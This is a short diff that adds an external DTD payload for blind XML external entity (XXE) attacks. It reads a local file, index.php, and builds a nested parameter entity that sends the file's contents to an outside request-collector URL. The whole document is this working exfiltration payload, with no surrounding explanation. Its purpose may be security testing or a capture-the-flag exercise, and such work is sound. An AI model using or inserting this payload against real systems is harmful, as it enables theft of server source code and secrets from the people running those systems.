@@ -1,0 +1,4 @@
+<!ENTITY % xx SYSTEM "file://index.php" >
+<!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'https://hookb.in/gge1JJ37BYTlL30dV3g6/?x=%xx;'>">
+%eval;
+%xxe;
